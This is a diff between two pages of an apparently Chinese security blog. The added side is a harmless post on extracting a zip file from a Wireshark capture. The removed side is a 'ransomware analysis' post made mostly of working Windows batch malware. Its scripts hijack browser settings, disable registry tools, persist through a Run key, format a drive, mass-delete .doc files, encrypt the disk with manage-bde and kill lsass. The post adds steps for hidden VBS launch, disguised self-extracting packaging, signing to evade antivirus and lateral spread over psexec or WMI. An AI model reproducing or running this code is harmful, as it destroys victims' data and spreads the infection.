@@ -73,7 +73,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="网络安全,恶意代码攻击,">
+  <meta name="keywords" content="python,网络安全,">
 
 
 
@@ -91,18 +91,18 @@
 
 
 
-<meta name="description" content="本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关 通过批处理修改IE注册表的方法     QQ群：397745473">
-<meta name="keywords" content="网络安全,恶意代码攻击">
+<meta name="description" content="提取wireshark中的文件 504的文件头，是个zip的PK的十六进制，现在想把这段数据抓取出来然后转换为zip文件 更多参考：https://www.t00ls.net/thread-47172-1-1.html QQ群：397745473">
+<meta name="keywords" content="python,网络安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="勒索病毒分析案例">
-<meta property="og:url" content="http://vksec.com/2019/07/19/41_勒索病毒分析案例/index.html">
+<meta property="og:title" content="提取wireshark中的文件">
+<meta property="og:url" content="http://vksec.com/2019/07/25/56_提取wireshark中的文件/index.html">
 <meta property="og:site_name" content="Openresty Python LUA">
-<meta property="og:description" content="本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关 通过批处理修改IE注册表的方法     QQ群：397745473">
+<meta property="og:description" content="提取wireshark中的文件 504的文件头，是个zip的PK的十六进制，现在想把这段数据抓取出来然后转换为zip文件 更多参考：https://www.t00ls.net/thread-47172-1-1.html QQ群：397745473">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-07-23T01:28:18.000Z">
+<meta property="og:updated_time" content="2019-07-26T00:58:23.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="勒索病毒分析案例">
-<meta name="twitter:description" content="本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关 通过批处理修改IE注册表的方法     QQ群：397745473">
+<meta name="twitter:title" content="提取wireshark中的文件">
+<meta name="twitter:description" content="提取wireshark中的文件 504的文件头，是个zip的PK的十六进制，现在想把这段数据抓取出来然后转换为zip文件 更多参考：https://www.t00ls.net/thread-47172-1-1.html QQ群：397745473">
 
 
 
@@ -130,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://vksec.com/2019/07/19/41_勒索病毒分析案例/">
+  <link rel="canonical" href="http://vksec.com/2019/07/25/56_提取wireshark中的文件/">
 
 
 
 
 
-  <title>勒索病毒分析案例 | Openresty Python LUA</title>
+  <title>提取wireshark中的文件 | Openresty Python LUA</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
@@ -275,7 +275,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2019/07/19/41_勒索病毒分析案例/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2019/07/25/56_提取wireshark中的文件/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -296,7 +296,7 @@
             
             
               
-                勒索病毒分析案例
+                提取wireshark中的文件
               
             
           </h2>
@@ -311,8 +311,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-19T03:03:03+08:00">
-                2019-07-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-25T03:03:03+08:00">
+                2019-07-25
               </time>
             
 
@@ -334,8 +334,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
                   </a>
                 </span>
 
@@ -352,8 +352,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/07/19/41_勒索病毒分析案例/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/19/41_勒索病毒分析案例/" itemprop="commentCount"></span>
+                <a href="/2019/07/25/56_提取wireshark中的文件/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/25/56_提取wireshark中的文件/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -378,29 +378,22 @@
       
 
       
-        <h1 id="本篇所有代码具有攻击性，请在虚拟机测试-造成损失与本人无关"><a href="#本篇所有代码具有攻击性，请在虚拟机测试-造成损失与本人无关" class="headerlink" title="本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关"></a>本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关</h1><ol>
-<li>通过批处理修改IE注册表的方法</li>
-</ol>
-<p>   QQ群：397745473</p>
+        <p>提取wireshark中的文件</p>
+<p>504的文件头，是个zip的PK的十六进制，现在想把这段数据抓取出来然后转换为zip文件</p>
+<p>更多参考：<a href="https://www.t00ls.net/thread-47172-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-47172-1-1.html</a></p>
+<p>QQ群：397745473</p>
 <a id="more"></a> 
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"># 改首页</span><br><span class="line">reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "<span class="built_in">Start</span> Page" /t reg_sz /d www.baidu.com /f </span><br><span class="line">reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d www.baidu.com /f</span><br><span class="line">reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Search Page" /t reg_sz /d www.baidu.com /f</span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Default_Page_URL" /t reg_sz /d www.baidu.com /f </span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Default_Search_URL" /t reg_sz /d www.baidu.com /f </span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "First Home Page" /t reg_sz /d www.baidu.com /f </span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "Search Page" /t reg_sz /d www.baidu.com /f </span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN" /v "<span class="built_in">Start</span> Page" /t reg_sz /d www.baidu.com /f</span><br><span class="line"></span><br><span class="line"># 禁用注册表</span><br><span class="line">reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "HomePage" /t REG_DWORD /d <span class="number">1</span>/f</span><br><span class="line"># 禁用主页修改</span><br><span class="line">reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"># 加启动项</span><br><span class="line">reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d <span class="variable">%windir%</span>\system\oldboy.bat /f </span><br><span class="line"># 把自己复制到system32目录中</span><br><span class="line"><span class="built_in">copy</span> %<span class="number">0</span> <span class="variable">%windir%</span>\System32\oldboy.bat</span><br></pre></td></tr></table></figure>
-<p>勒索病毒代码分析</p>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"># 格式化磁盘</span><br><span class="line"><span class="built_in">echo</span> y |<span class="built_in">format</span> d: /q</span><br><span class="line"># 快速删除文件</span><br><span class="line"><span class="built_in">del</span> c:\*.doc /s /f /q</span><br><span class="line"># 使用windows工具加密磁盘</span><br><span class="line">manage-bde -on d: -RecoveryPassword -RecoveryKey x:\</span><br><span class="line"># 杀掉对话框</span><br><span class="line"><span class="built_in">taskkill</span> /f /im fvenotify.exe &gt; null</span><br><span class="line"># 用bde对x盘加密</span><br><span class="line">manage-bde -protectors -add d: -rp -rk x:\</span><br><span class="line"># 杀掉对话框</span><br><span class="line"><span class="built_in">taskkill</span> /f /im fvenotify.exe &gt; null</span><br><span class="line"># 延迟<span class="number">30</span>秒</span><br><span class="line">TIMEOUT /T <span class="number">30</span></span><br><span class="line"><span class="built_in">taskkill</span> /f /im fvenotify.exe &gt; null</span><br><span class="line"><span class="built_in">echo</span> hello &gt; c:\windows\windows1.txt</span><br><span class="line"># 写提示信息</span><br><span class="line"><span class="built_in">echo</span> "your company All your data have been deleted.<span class="keyword">If</span> you........"</span><br><span class="line"><span class="built_in">start</span> c:\windows\windows1.txt</span><br><span class="line"><span class="built_in">set</span> superxiaoyuerc=<span class="built_in">echo</span></span><br><span class="line"># 加IE启动</span><br><span class="line">#　杀杀毒软件进程</span><br><span class="line"></span><br><span class="line"># 杀桌面显示进程</span><br><span class="line"><span class="built_in">taskkill</span> /f /im explorer.exe &gt; null</span><br><span class="line"># 结束进程导致系统重启</span><br><span class="line"><span class="built_in">taskkill</span> /f /im lsass.exe &gt; null</span><br><span class="line"><span class="built_in">start</span> c:\windows\hax0r.html</span><br></pre></td></tr></table></figure>
-<p>更多批处理可以参考工具：</p>
-<p>1.吞噬者批处理编写器  <a href="http://www.ouyaoxiazai.com/soft/stgj/159/4616.html" target="_blank" rel="noopener">http://www.ouyaoxiazai.com/soft/stgj/159/4616.html</a></p>
-<p>2.Bat to exe Converter  工具 <a href="https://www.battoexe.com/" target="_blank" rel="noopener">https://www.battoexe.com/</a></p>
-<p>3.加数字签名绕过杀软查杀 工具 addSign.exe <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/tools/signtool-exe" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/tools/signtool-exe</a></p>
-<p>4.用vbs 调批处理</p>
-<p>隐藏窗口调用BAT</p>
-<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> ws = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>)</span><br><span class="line">ws.run <span class="string">"cmd /c c:\bingdu.bat"</span>,vbhide</span><br></pre></td></tr></table></figure>
-<p>1.把BAT 与 VBS文件压缩自解压</p>
-<p>2.解压后运行 2.vbs</p>
-<p>高级–&gt;bingdu.bat</p>
-<p>3.图标</p>
-<p>4.全部隐藏</p>
-<p>5.使用psexec进行内网传播</p>
-<p>利用WMI代替psexec——WMIEXEC.vbs</p>
-<p>内网传播更多参考 ：<a href="https://www.t00ls.net/viewthread.php?tid=21167" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=21167</a></p>
+<h1 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'filename.zip'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">'504B0304140000000800288DC34C58BD2C542C0500002C0700000E000000313532383031383837352E706E676D956D54926718C7B12C4D33ED45CD94B034E9D4C9B6F2A5D4503B1A5A274CB1B2E341A798D35EA82D4D110173B9AD48C8B9B2A395A5A8684C84694D54B0B65646BA91C0A333C2487C8530ECE909151C7E4BE19CDFFD7CB8CF7D5FE77F5FD7F5BF9E2B47306807BB0D763018CC213A2A220E06B35A3FBF6C9798766CD59401186CF9547444787CEE6D8D3C96FE6ECFCA659D3DA95AAAEACD52F6CAA8412F955F03CA66DF43E550386C0BB652A15020EE0D570E2C2D10865DF7FC9241854A484155BEFD4E7D8B2DD1865E52B1EE1A67C488E3A6CFEF7C63B62B42C4ACB3397DA01016BE80826C3D69EC8E74A44B790E0B12E71834460DAAA09A94BDAE45A1F79AFDDA2BFCB26778C1177486EB49F582C84709FFB2013AF4A019744C64DF105E28FB081AF702D4CBA1E9DE3F3B79DB7E09EBA65031C67AF19A8B20F2BCE512728D406AC8C3517E715BB1C47A21C6747D5B3D1485436BB5D1C06903E7A499DA79C1E341AFC01BC5CAEDB0987297FC727AAD667D58EFF8B16755BD20E22DC36DC5E6454157BD5050B31FE5A3F1F0A5B9D3EFAA00A36D779493E74226897FF6F45FED7210A3CBE4817B0BE8FBE4871D6684347385C3E5A3819A0139878BD9F8208F999071F7B593A187E4FF5B98074E76CDDAAA7021525D4E07A18F3B95A363F54EB400B58EC1C422EECD51508422EF4C5F982413197BA7752C425FEC34BB8C490BE671722288711E09860A78A286E5D8F9FEDC2D1F33DD5F411B220D4C71570F6A06CA1BD9EE5E7A07AC40A9D35CEF07ED5E636DBB90663F71657E7155639F7A384FC4F42AC54D069F5295C624BA6E5A1CB8C9971AE3125D7635F1090D08E19F3124C1C7491A48EA1A40F74D6C2FF1DD3F99B4E89D366D42DA3E35C38E078FD4545BA919E379C9FA6AA516ECF8548AB868A1CE28B87424AF98572F49F2E864A6DECFFF1E82C4EB7D84FD7452266549B1B5D979192776DD71F7719A33DCDEFE703781DE782299B3B5BC1D48739C9978699694264AB17270CEF1624D6B92CF1BE83F253864BF0BDF62ACF599469B1F3E7FFE4735B8DCEFA9306403157BA18AFC1439F93105098181E00411699E448FDB9B667A367E02D02DD426B5D879DCA083E63EB7D975CF01F1BF86A69A9BEB876164A9212CE8FDD1D0632D99100496E7F6B636E283479103C21093B70A16798B3F2B8FDDDCFE2660DAC1F92DD74AE20FBA55CEA623735A2A4A3C17B97DDEF046371EBCAE3CA0E30057D21C72D44FFFEAA0BC2F351D61AE3ABE6274A7545452BA654C799271F01160DF7D088E76F1C0A5E8EA6A684EED65161C9E193C0556631427EA1A2BCE5C6E8E6F3F4EE690D79A47668B14A5D211BA08F3FE3961DBF300693D64D344E500379990146DEEDEF959C3F636A4093F0F64C94E61C1563C2E8527D60FA13E18ACDA2F99F78989866F9F63F8145606F931132F9DB853DD909CA2CB559263A05D96B28763BB07C03FF66749329F3D7000FF0E021847C99A354F045D96065FABEF7EB420437BA14322E08C71F3C54087242BE4C96A8B4527E13ECCF6D69276F867CB76DEDD7104D1C9CCA18F5F31572C53696BBA5EE0B94654FF2CD334CAB01F72E61ECB62C49A3D9C8794223A72127FA0D076718FE8A038ACB66415B8ED6CEF4F9A0CA1E96A1A6FAB826974BE65A9ECF7F8F42C1C79D9601B5F7AA63C24E153C62582EEA552E9BED642774F822A2DF9305985FCE7FAD96DD181FE32E28868F521708B93851E1129929B0FF1EBB93D436BFFA05C256011350691E021BEC4FC91A6890A044EB9F86B8C465FB8CD3046F697A215303EBB66BD7AD15CA80C3DF2AAC88243E7952176AF6B886B2408969BFE82B0E8484C44E3FE6F0AFF07504B01021400140000000800288DC34C58BD2C542C0500002C0700000E0000000000000000002000000000000000313532383031383837352E706E67504B050600000000010001003C000000580500000000'</span>.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
+<p>ipython或者python终端直接运行</p>
+<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>1、工具binwalk 分离数据包<br>2、16进制工具（HEX）找到头和尾,删除多余数据,另存为<em>.zip<br>3、Wireshark中找到对应通信流，直接另存为</em>.zip,打不开的话，说明混淆了多余数据，还是需要用Hex修正</p>
+<h1 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h1><p>Wireshark找到对应的数据包后可以直接另存为啊</p>
+<h1 id="方案四"><a href="#方案四" class="headerlink" title="方案四"></a>方案四</h1><p>  用networkminer可以直接提取</p>
+<p><a href="https://mp.weixin.qq.com/s/-EmE0O8vclfBv71d2TbJfQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-EmE0O8vclfBv71d2TbJfQ</a></p>
+<p>这里有篇文章你看看  </p>
+<h1 id="方案五"><a href="#方案五" class="headerlink" title="方案五"></a>方案五</h1><p>借助mysql来导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x504B0304140000000800288DC34C58BD2C542C0500002C0700000E000 into dumpfile &apos;/tmp/1.zip&apos;;</span><br></pre></td></tr></table></figure>
+<h1 id="方案六"><a href="#方案六" class="headerlink" title="方案六"></a>方案六</h1><p>  wireshark可以提取数据流 原生的(文件 -&gt;导出对象)</p>
+<p>也可以使用foremost  </p>
 <p>QQ群：397745473</p>
 
       
@@ -431,9 +424,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
+            <a href="/tags/python/" rel="tag"># python</a>
           
-            <a href="/tags/恶意代码攻击/" rel="tag"># 恶意代码攻击</a>
+            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
           
         </div>
       
@@ -446,8 +439,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/03/15/39_信息收集之Navicat密码/" rel="next" title="信息收集之Navicat密码">
-                <i class="fa fa-chevron-left"></i> 信息收集之Navicat密码
+              <a href="/2019/07/24/54_查CDN真实IP目前最有效的方法/" rel="next" title="查CDN真实IP目前最有效的方法">
+                <i class="fa fa-chevron-left"></i> 查CDN真实IP目前最有效的方法
               </a>
             
           </div>
@@ -455,10 +448,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/19/40_安全导论网络安全基础入门网络安全法律/" rel="prev" title="安全导论 网络安全基础入门 网络安全法律">
-                安全导论 网络安全基础入门 网络安全法律 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -654,7 +643,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#本篇所有代码具有攻击性，请在虚拟机测试-造成损失与本人无关"><span class="nav-number">1.</span> <span class="nav-text">本篇所有代码具有攻击性，请在虚拟机测试,造成损失与本人无关</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#方案一"><span class="nav-number">1.</span> <span class="nav-text">方案一</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方案二"><span class="nav-number">1.1.</span> <span class="nav-text">方案二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#方案三"><span class="nav-number">2.</span> <span class="nav-text">方案三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#方案四"><span class="nav-number">3.</span> <span class="nav-text">方案四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#方案五"><span class="nav-number">4.</span> <span class="nav-text">方案五</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#方案六"><span class="nav-number">5.</span> <span class="nav-text">方案六</span></a></li></ol></div>
             
 
           </div>
@@ -799,9 +788,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://vksec.com/2019/07/19/41_勒索病毒分析案例/';
-          this.page.identifier = '2019/07/19/41_勒索病毒分析案例/';
-          this.page.title = '勒索病毒分析案例';
+          this.page.url = 'http://vksec.com/2019/07/25/56_提取wireshark中的文件/';
+          this.page.identifier = '2019/07/25/56_提取wireshark中的文件/';
+          this.page.title = '提取wireshark中的文件';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://vksec.disqus.com/embed.js';
